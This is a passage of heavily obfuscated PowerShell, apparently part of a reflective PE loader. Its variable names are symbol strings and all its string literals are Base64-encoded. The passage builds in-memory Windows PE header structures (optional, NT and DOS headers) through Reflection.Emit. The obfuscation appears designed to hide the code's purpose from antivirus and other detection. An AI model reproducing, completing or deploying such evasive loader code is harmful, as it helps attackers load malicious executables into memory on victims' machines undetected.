		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(224) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(232) | Out-Null
		${__/=\__/\/=\_/==\} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${__/=\__/\/=\_/==\}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIAMwAyAA=='))), ${/=\/===\/\__/=\/=}, [System.ValueType], 224)
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${__/=\__/==\/\/\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(28) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${_/\_/\/==\_/=\/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${_/\___/\___/===\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(76) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(84) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(92) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${/=\/\/\/==\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		${/===\/\_/==\__/\/} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${/===\/\_/==\__/\/}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwA2ADQA'))), ${/=\/===\/\__/=\/=}, [System.ValueType], 264)
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${___/=\/\/\___/==\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${__/=\__/\/=\_/==\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\/===\__/\/\/\_} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${_/\/===\__/\/\/\_}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwAzADIA'))), ${/=\/===\/\__/=\/=}, [System.ValueType], 248)
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${___/=\/\/\___/==\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${/===\/\_/==\__/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/=\/=\/=\_/=\__} = ${____/\/\_/\__/===}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${__/=\/=\/=\_/=\__}
		${/=\/===\/\__/=\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${____/\/\_/\__/===} = ${__/=\/==\___/\_/\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABPAFMAXwBIAEUAQQBEAEUAUgA='))), ${/=\/===\/\__/=\/=}, [System.ValueType], 64)
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQBnAGkAYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAYgBsAHAA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcgBsAGMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcABhAHIAaABkAHIA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AaQBuAGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQB4AGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwB1AG0A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGkAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAHIAbABjAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AdgBuAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/=\__/\/\/=\/=\/} = ${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzAA=='))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${___/=\/\/==\/\__/} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${/=\/\/\/\_/=\_/\_} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
		${_/\/\_/=\/\/=====} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${/=\__/\/==\_/==\/}, ${___/=\/\/==\/\__/}, ${/=\/\/\/\_/=\_/\_}, @([Int32] 4))
		${_/=\__/\/\/=\/=\/}.SetCustomAttribute(${_/\/\_/=\/\/=====})
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAZAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${____/\/\_/\__/===}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAbgBmAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
